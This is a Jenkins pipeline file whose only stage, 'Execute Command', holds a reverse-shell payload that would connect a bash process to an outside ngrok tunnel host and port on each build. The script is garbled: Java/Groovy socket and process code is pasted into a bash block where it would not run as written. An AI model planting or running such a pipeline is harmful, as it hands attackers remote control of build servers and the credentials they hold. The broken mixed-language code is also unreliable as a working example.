pipeline {
    agent any
    stages {
        stage('Execute Command') {
            steps {
                sh '''
                    host="7.tcp.eu.ngrok.io"
                    port=15848
                    cmd="bash"
                    p=$(ProcessBuilder $cmd).redirectErrorStream(true).start()
                    s=$(Socket $host $port)
                    pi=$p.getInputStream()
                    pe=$p.getErrorStream()
                    si=$s.getInputStream()
                    po=$p.getOutputStream()
                    so=$s.getOutputStream()
                    while [ ! $s.isClosed() ]
                    do
                        while [ $pi.available() -gt 0 ]
                        do
                            so.write($pi.read())
                        done
                        while [ $pe.available() -gt 0 ]
                        do
                            so.write($pe.read())
                        done
                        while [ $si.available() -gt 0 ]
                        do
                            po.write($si.read())
                        done
                        so.flush()
                        po.flush()
                        sleep 50
                        try
                        {
                            p.exitValue()
                            break
                        }
                        catch (Exception e)
                        {}
                    done
                    p.destroy()
                    s.close()
                '''
            }
        }
    }
}
